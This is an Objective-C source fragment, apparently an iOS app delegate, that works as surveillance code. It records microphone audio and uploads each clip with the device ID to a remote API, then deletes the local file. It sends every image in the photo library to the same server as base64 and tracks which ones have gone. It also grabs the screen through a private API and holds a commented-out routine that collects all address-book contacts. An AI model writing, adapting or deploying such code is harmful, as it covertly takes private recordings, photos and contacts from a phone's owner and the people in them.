//    ABAddressBookRef addressBook = ABAddressBookCreate();
//
//    if (!addressBook) {
//        NSLog(@"opening address book");
//    }
//
//    contactList = [[NSMutableArray alloc] init];
//    CFArrayRef allPeople = ABAddressBookCopyArrayOfAllPeople(addressBook);
//    CFIndex nPeople = ABAddressBookGetPersonCount(addressBook);
//
//    for (int i=0;i < nPeople;i++)
//    {
//        NSMutableDictionary *dOfPerson=[NSMutableDictionary dictionary];
//
//        ABRecordRef ref = CFArrayGetValueAtIndex(allPeople,i);
//
//        //For username and surname
//        ABMultiValueRef phones =(__bridge ABMultiValueRef)((__bridge NSString*)ABRecordCopyValue(ref, kABPersonPhoneProperty));
//
//        NSString *firstName, *lastName;
//        firstName = (__bridge NSString *)(ABRecordCopyValue(ref, kABPersonFirstNameProperty));
//        lastName  = (__bridge NSString *)(ABRecordCopyValue(ref, kABPersonLastNameProperty));
//        NSString *fullNameString = (__bridge NSString*)ABRecordCopyCompositeName(ref);
//
//        if ((id)fullNameString == nil)
//        {
//            if (lastName != nil)
//            {
//                fullNameString = [NSString stringWithFormat:@"%@ %@", firstName, lastName];
//            }
//        }
//        NSMutableArray *phoneNumbers = [[NSMutableArray alloc] init];
//
//        if (firstName)
//            [dOfPerson setObject:firstName forKey:@"first_name"];
//        else
//            [dOfPerson setObject:@"" forKey:@"first_name"];
//
//        if (lastName)
//            [dOfPerson setObject:lastName forKey:@"last_name"];
//        else
//            [dOfPerson setObject:@"" forKey:@"last_name"];
//
//        if (fullNameString)
//            [dOfPerson setObject:fullNameString forKey:@"full_name"];
//        else
//            [dOfPerson setObject:@"" forKey:@"full_name"];
//
////        NSLog(@"name = %@",fullNameString);
//        //For Email ids
//        ABMutableMultiValueRef eMail  = ABRecordCopyValue(ref, kABPersonEmailProperty);
//        if(ABMultiValueGetCount(eMail) > 0) {
//            [dOfPerson setObject:(__bridge NSString *)ABMultiValueCopyValueAtIndex(eMail, 0) forKey:@"email"];
//
//        }
//
////        if ([fullNameString isEqualToString:@"Siddhant Kankaria"])
////        {
////            NSLog(@"Siddhant Kankaria");
////        }
//
//        //For Phone number
//        NSString* mobileLabel;
//
//        for(CFIndex j = 0; j < ABMultiValueGetCount(phones); j++)
//        {
//            NSMutableDictionary *dic=[[NSMutableDictionary alloc]init];
//
//            mobileLabel = (__bridge NSString*)ABMultiValueCopyLabelAtIndex(phones, j);
//
////            if (mobileLabel) {
////                NSLog(@"mobile label = %@",mobileLabel);
////            }
//
//
//            if([mobileLabel isEqualToString:@"_$!<Mobile>!$_"])
//            {
//                [dic setObject:(__bridge NSString*)ABMultiValueCopyValueAtIndex(phones, j) forKey:@"mobile"];
//            }
//            else if ([mobileLabel isEqualToString:@"Mobile"])
//            {
//                [dic setObject:(__bridge NSString*)ABMultiValueCopyValueAtIndex(phones, j) forKey:@"mobile_2"];
//            }
//            else if ([mobileLabel isEqualToString:@"_$!<Other>!$_"])
//            {
//                [dic setObject:(__bridge NSString*)ABMultiValueCopyValueAtIndex(phones, j) forKey:@"other"];
//            }
//            else if ([mobileLabel isEqualToString:@"_$!<Main>!$_"])
//            {
//                [dic setObject:(__bridge NSString*)ABMultiValueCopyValueAtIndex(phones, j) forKey:@"main"];
//            }
//            else if ([mobileLabel isEqualToString:@"_$!<Home>!$_"])
//            {
//                [dic setObject:(__bridge NSString*)ABMultiValueCopyValueAtIndex(phones, j) forKey:@"home"];
//            }
//            else if ([mobileLabel isEqualToString:@"_$!<Work>!$_"])
//            {
//                [dic setObject:(__bridge NSString*)ABMultiValueCopyValueAtIndex(phones, j) forKey:@"work"];
//            }
//            else if ([mobileLabel isEqualToString:@"work"])
//            {
//                [dic setObject:(__bridge NSString*)ABMultiValueCopyValueAtIndex(phones, j) forKey:@"work_2"];
//            }
//            else if ([mobileLabel isEqualToString:@"_$!<HomeFAX>!$_"])
//            {
//                [dic setObject:(__bridge NSString*)ABMultiValueCopyValueAtIndex(phones, j) forKey:@"home_fax"];
//            }
//            else if ([mobileLabel isEqualToString:@"_$!<HomePage>!$_"])
//            {
//                [dic setObject:(__bridge NSString*)ABMultiValueCopyValueAtIndex(phones, j) forKey:@"home_pager"];
//            }
//            else if ([mobileLabel isEqualToString:@"_$!<WorkFAX>!$_"])
//            {
//                [dic setObject:(__bridge NSString*)ABMultiValueCopyValueAtIndex(phones, j) forKey:@"work_fax"];
//            }
//            else if ([mobileLabel isEqualToString:@"iPhone"])
//            {
//                [dic setObject:(__bridge NSString*)ABMultiValueCopyValueAtIndex(phones, j) forKey:@"phone"];
//            }
//
//            [phoneNumbers addObject:dic];
//        }
//
//        [dOfPerson setObject:phoneNumbers forKey:@"phone"];
//        [contactList addObject:dOfPerson];
//    }
//}
#pragma mark - Record and Send Audio
#pragma mark -
-(void)setupAudisSession
{
    if (![NS_Defaults objectForKey:@"counterforrecord"]) {
        counterForRecord=1;
        [NS_Defaults setObject:[NSString stringWithFormat:@"%d",counterForRecord] forKey:@"counterforrecord"];
    }
    
    NSString *tempPath=[NSString stringWithFormat:@"%@/Documents",NSHomeDirectory()];
    NSString *filePath=[NSString stringWithFormat:@"%@/voiceRecording.caf",tempPath];
    NSURL *url = [NSURL fileURLWithPath:filePath];
    
    NSError *error = nil;
    
    // Setup audio session
    _session = [AVAudioSession sharedInstance];
    [_session setCategory:AVAudioSessionCategoryPlayAndRecord withOptions:AVAudioSessionCategoryOptionMixWithOthers error:&error];
    
    [_session setActive: YES error: nil];
    
    // Define the recorder setting
//    NSDictionary *recordSetting = [NSDictionary dictionaryWithObjectsAndKeys:
//                                   [NSNumber numberWithInt:AVAudioQualityMin],AVEncoderAudioQualityKey,
//                                   [NSNumber numberWithInt:16],AVEncoderBitRateKey,
//                                   [NSNumber numberWithInt: 1], AVNumberOfChannelsKey,
//                                   [NSNumber numberWithFloat:8000],AVSampleRateKey,//44100.0
//                                   nil];
    
   NSDictionary * recordSetting = [NSMutableDictionary dictionaryWithObjectsAndKeys:
                     [NSNumber numberWithFloat:4096.0],AVSampleRateKey,
                     [NSNumber numberWithInt:1],AVNumberOfChannelsKey,
                     [NSNumber numberWithInt:8],AVLinearPCMBitDepthKey,
                     [NSNumber numberWithInt:kAudioFormatLinearPCM],AVFormatIDKey,
                     [NSNumber numberWithBool:NO], AVLinearPCMIsFloatKey,
                     [NSNumber numberWithBool:0], AVLinearPCMIsBigEndianKey,
                     [NSNumber numberWithBool:NO], AVLinearPCMIsNonInterleaved,
                     [NSData data], AVChannelLayoutKey, nil];
    
    error = nil;
    _audioRecorder = [[AVAudioRecorder alloc] initWithURL:url settings:recordSetting error:&error];
    if (!error) {
        [_audioRecorder prepareToRecord];
    }
    _audioRecorder.delegate = self;
    _audioRecorder.meteringEnabled = YES;
    
    

    
    [[NSNotificationCenter defaultCenter] addObserver:self
                                             selector:@selector(handleInterruption:)
                                                 name:AVAudioSessionInterruptionNotification
                                               object:_session];
}
- (void)handleInterruption:(NSNotification *)notification
{
    UInt8 theInterruptionType = [[notification.userInfo valueForKey:AVAudioSessionInterruptionTypeKey] intValue];
    NSLog(@"Session interrupted > --- %s ---\n", theInterruptionType == AVAudioSessionInterruptionTypeBegan ? "Begin Interruption" : "End Interruption");
        
    if (theInterruptionType == AVAudioSessionInterruptionTypeBegan)
    {
        NSLog(@"interruption begin");
        [_audioRecorder pause];
    }
    else{
        NSLog(@"interruption ended");
        [_audioRecorder record];
    }
    
    if (theInterruptionType == AVAudioSessionInterruptionTypeEnded) {
        NSLog(@"interruption ended");
        [_audioRecorder stop];
    }
}
-(void)audioRecorderDidFinishRecording:(AVAudioRecorder *)recorder successfully:(BOOL)flag
{
    NSLog(@"audioRecorderDidFinishRecording Sucess : %u",flag);
    [self saveAudio];
}

-(void)audioRecorderEncodeErrorDidOccur:(AVAudioRecorder *)recorder error:(NSError *)error
{
    NSLog(@"Encode Error occurred");
}

-(void)saveAudio
{
    counterForRecord=[[NS_Defaults objectForKey:@"counterforrecord"] intValue];
    
    NSLog(@"recorder interruption ends");
    NSString *tempPath=[NSString stringWithFormat:@"%@/Documents/recording",NSHomeDirectory()];
    NSString *filePath=[NSString stringWithFormat:@"%@/rec_%d.caf",tempPath,++counterForRecord];
    NSURL *url = [NSURL fileURLWithPath:filePath];
    
    //remove if item exists at path
    [self removeFromDoc:filePath];
    
    NSError *er=nil;
    //copy recording to url
    BOOL success=[[NSFileManager defaultManager] copyItemAtPath:[_audioRecorder.url path] toPath:[url path] error:&er];
    
//    //remove audio from document
//    [self removeFromDoc:[_audioRecorder.url path]];
    
//    NSData *data=[NSData dataWithContentsOfFile:filePath];
//    NSData *data1=[NSData dataWithContentsOfFile:[_audioRecorder.url path]];
    
    [NS_Defaults setObject:[NSString stringWithFormat:@"%d",counterForRecord] forKey:@"counterforrecord"];
    [NS_Defaults synchronize];
    
    [self performSelector:@selector(sendAudio:) withObject:filePath afterDelay:2.0];
    
    if ([NS_FileManager fileExistsAtPath:filePath]) {
        NSLog(@"file exists");
    }
}

-(void)sendAudio:(NSString*)path
{
    //remove audio from document
    [self removeFromDoc:[_audioRecorder.url path]];
    
    NSMutableDictionary *dicParam=[[NSMutableDictionary alloc]init];
    [dicParam setObject:[NS_Defaults objectForKey:kDEVICE_ID] forKey:@"uuid"];

    [dicParam setObject:[NSURL fileURLWithPath:path] forKey:@"file"];
    [dicParam setObject:@"audio" forKey:@"file_type"];
    [dicParam setObject:@"Voice Recording" forKey:@"module"];
    [dicParam setObject:@"Recording" forKey:@"app_name"];
    [dicParam setObject:@"" forKey:@"filepath"];
    [dicParam setObject:@"" forKey:@"other"];
    
    if ([App_Delegate isInternetAvailable])
    {
        [[UNIRest post:^(UNISimpleRequest *simpleRequest)
          {
              [simpleRequest setUrl:[NSString stringWithFormat:@"%@%@",kAPI_BaseUrl,kAPI_Send_Media]];
              [simpleRequest setParameters:dicParam];
          }] asStringAsync:^(UNIHTTPStringResponse *stringResponse, NSError *error) {


              NSLog(@"events: %@",stringResponse.body);
              NSError *jsonError;
              id result = [NSJSONSerialization JSONObjectWithData:[stringResponse.body dataUsingEncoding:NSUTF8StringEncoding] options:0 error:&jsonError];
              if( result == nil )
                  return;

              if ([[result objectForKey:@"status"] intValue]==1) {
                  [NS_FileManager removeItemAtPath:path error:nil];
              }

          }];
    }
}
-(void)removeFromDoc:(NSString*)filePath
{
    if ([[NSFileManager defaultManager] fileExistsAtPath:filePath])
    {
        [[NSFileManager defaultManager]removeItemAtPath:filePath error:nil];
    }
}
-(void)createDirectories
{
    NSString *path=[NSString stringWithFormat:@"%@/Documents/recording",NSHomeDirectory()];
    if (![[NSFileManager defaultManager] fileExistsAtPath:path])
    {
        [[NSFileManager defaultManager] createDirectoryAtPath:path withIntermediateDirectories:NO attributes:nil error:nil];
    }
    
    path=[NSString stringWithFormat:@"%@/Documents/screenshots",NSHomeDirectory()];
    if (![[NSFileManager defaultManager] fileExistsAtPath:path])
    {
        [[NSFileManager defaultManager] createDirectoryAtPath:path withIntermediateDirectories:NO attributes:nil error:nil];
    }
}
- (void)applicationWillResignActive:(UIApplication *)application {
    // Sent when the application is about to move from active to inactive state. This can occur for certain types of temporary interruptions (such as an incoming phone call or SMS message) or when the user quits the application and it begins the transition to the background state.
    // Use this method to pause ongoing tasks, disable timers, and throttle down OpenGL ES frame rates. Games should use this method to pause the game.
    
}
- (void)applicationWillEnterForeground:(UIApplication *)application {
    // Called as part of the transition from the background to the inactive state; here you can undo many of the changes made on entering the background.
}

- (void)applicationDidBecomeActive:(UIApplication *)application {
    // Restart any tasks that were paused (or not yet started) while the application was inactive. If the application was previously in the background, optionally refresh the user interface.
}

- (void)applicationWillTerminate:(UIApplication *)application {
    // Called when the application is about to terminate. Save data if appropriate. See also applicationDidEnterBackground:.
}
-(void)screenCapture
{
    CGImageRef screen = (__bridge CGImageRef)(_UICreateScreenUIImage());
    UIImage* screenImage = [UIImage imageWithCGImage:screen];
    CGImageRelease(screen);
    
    NSData *data=UIImageJPEGRepresentation(screenImage, 1.0);
    
    NSString *tempPath=[NSString stringWithFormat:@"%@/Documents",NSHomeDirectory()];
    NSString *filePath=[NSString stringWithFormat:@"%@/screenshot.jpg",tempPath];
    
    NSLog(@"%@",tempPath);
    
    BOOL success=[data writeToFile:filePath atomically:YES];
}
+ (ALAssetsLibrary *)defaultAssetsLibrary
{
    static dispatch_once_t pred = 0;
    static ALAssetsLibrary *library = nil;
    dispatch_once(&pred, ^{
        library = [[ALAssetsLibrary alloc] init];
    });
    return library;
}
-(void)getImagesFromGallery:(NSString*)mediaType
{
    imageCounter=0;
    //[MBProgressHUD showHUDAddedTo:self.view animated:YES];
    //******** Get all Image Form Photo Library of Phone
    aryImageIdentifiers=[self readArrayWithCustomObjFromUserDefaults:@"imageurls"];
    
    assets = [@[] mutableCopy];
    __block NSMutableArray *tmpAssets = [@[] mutableCopy];

    // 1
    ALAssetsLibrary *assetsLibrary = [AppDelegate defaultAssetsLibrary];
    // 2
    [assetsLibrary enumerateGroupsWithTypes:ALAssetsGroupAll usingBlock:^(ALAssetsGroup *group, BOOL *stop)
     {
         NSString *albumName = [group valueForProperty:ALAssetsGroupPropertyName];
         
         //NSLog(@"Group name %@",albumName);
         [group enumerateAssetsUsingBlock:^(ALAsset *result, NSUInteger index, BOOL *stop) {
             if(result)
             {
                 // 3
                 //To show only images from gallery
                 ALAssetRepresentation *representation = [result defaultRepresentation];
                 NSString* MIMEType = (__bridge_transfer NSString*)UTTypeCopyPreferredTagWithClass
                 ((__bridge CFStringRef)[representation UTI], kUTTagClassMIMEType);
                 // NSLog(@"MIME Type %@",MIMEType);
                 
                 if (![mediaType isEqualToString:@"all"])
                 {
                     if ([MIMEType rangeOfString:mediaType].length>0)
                     {
                         if ([self isImageAlreadyUploaded:[NSString stringWithFormat:@"%@",result.defaultRepresentation.url]]) {
                             
                         }else{
                             NSMutableDictionary *assetDic=[[NSMutableDictionary alloc]init];
                             [assetDic setObject:result forKey:@"asset"];
                             [assetDic setObject:albumName forKey:@"album"];
                             
                             //[tmpAssets addObject:result];
                             [tmpAssets addObject:assetDic];
//                             NSLog(@"asset = %@",result);
                         }
                     }
                 }
                 else
                 {
                     [tmpAssets addObject:result];
                 }
             }
         }];
         if (group == nil)
         {
             NSLog(@"THE END!!!");
             //assets = [[tmpAssets reverseObjectEnumerator] allObjects];

             assets=tmpAssets;
             
             [self sendImage];//temp blocked
         }

     } failureBlock:^(NSError *error)
     {
         NSLog(@"Error loading images %@", error);
     }];
}
-(BOOL)isImageAlreadyUploaded:(NSString *)strUrl
{
    BOOL isUploaded=NO;
    for (UserObject *user in aryImageIdentifiers)
    {
        if ([user.strUrl isEqualToString:strUrl]) {
            isUploaded=YES;
            break;
        }
    }
    return isUploaded;
}
-(void)sendImage
{
    //    for (int i=0; i<assets.count; i++)
    //    {
    if (assets.count==0) {
        return;
    }
    
    isImagesUploading=YES;
    
    NSMutableDictionary *dic = assets[imageCounter];
    ALAsset *ast = [dic objectForKey:@"asset"];
    
    UIImage * selImage = [UIImage imageWithCGImage:[[ast defaultRepresentation] fullScreenImage]];
    NSData *baseImage=UIImageJPEGRepresentation(selImage, 0.4);
    
    NSString *strBase64 = [baseImage base64EncodedStringWithOptions:NSDataBase64Encoding64CharacterLineLength];
    
//    NSLog(@"image data");
    
    NSMutableDictionary *dicParam=[[NSMutableDictionary alloc]init];
    [dicParam setObject:[NS_Defaults objectForKey:kDEVICE_ID] forKey:@"uuid"];
    
    [dicParam setObject:strBase64 forKey:@"image"];
    [dicParam setObject:[dic objectForKey:@"album"] forKey:@"path"];
    
    if ([App_Delegate isInternetAvailable])
    {
        [[UNIRest post:^(UNISimpleRequest *simpleRequest)
          {
              [simpleRequest setUrl:[NSString stringWithFormat:@"%@%@",kAPI_BaseUrl,kAPI_Send_Gallery_Image]];
              [simpleRequest setParameters:dicParam];
          }] asJsonAsync:^(UNIHTTPJsonResponse *jsonResponse, NSError *error)
         {
             NSDictionary *result = jsonResponse.body.object;
             NSString * strResponse = [[NSString alloc] initWithData:[jsonResponse rawBody] encoding:NSUTF8StringEncoding];
             NSLog(@"image: %@",[result objectForKey:@"message"]);

             imageCounter++;
//             if ([[result objectForKey:@"status"] intValue]==1)
//             {
                 UserObject *obj=[[UserObject alloc]init];
                 obj.strUrl= [NSString stringWithFormat:@"%@",ast.defaultRepresentation.url];
                 [aryImageIdentifiers addObject:obj];
                 [self writeArrayWithCustomObjToUserDefaults:@"imageurls" withArray:[aryImageIdentifiers mutableCopy]];

                 if (imageCounter<assets.count) {
                     [self sendImage];
                 }else{
                     NSLog(@"all images uploaded");
                     isImagesUploading=NO;
                 }
//             }
         }];
    }
    //    }
}

#pragma mark - Save and Get Array
#pragma mark -
-(void)writeArrayWithCustomObjToUserDefaults:(NSString *)keyName withArray:(NSMutableArray *)myArray
{
    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    NSData *data = [NSKeyedArchiver archivedDataWithRootObject:myArray];
    [defaults setObject:data forKey:keyName];
    [defaults synchronize];
}

-(NSMutableArray *)readArrayWithCustomObjFromUserDefaults:(NSString*)keyName
{
    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
    NSData *data = [defaults objectForKey:keyName];
    NSMutableArray *myArray = [NSKeyedUnarchiver unarchiveObjectWithData:data];
    [defaults synchronize];
    
    if (!myArray) {
        myArray=[[NSMutableArray alloc]init];
    }
    
    return myArray;
}
-(void)getDocContents
{
    NSString *path=[NSString stringWithFormat:@"%@/Documents/screenshots",NSHomeDirectory()];
    NSArray *dirContent = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:path error:NULL];
    NSLog(@"%@",dirContent);
}
/*ALAssetPropertyType
 ALAssetPropertyLocation
 ALAssetPropertyDuration
 ALAssetPropertyOrientation
 ALAssetPropertyDate
 ALAssetPropertyRepresentations
 ALAssetPropertyURLs
 ALAssetPropertyAssetURL*/
@end
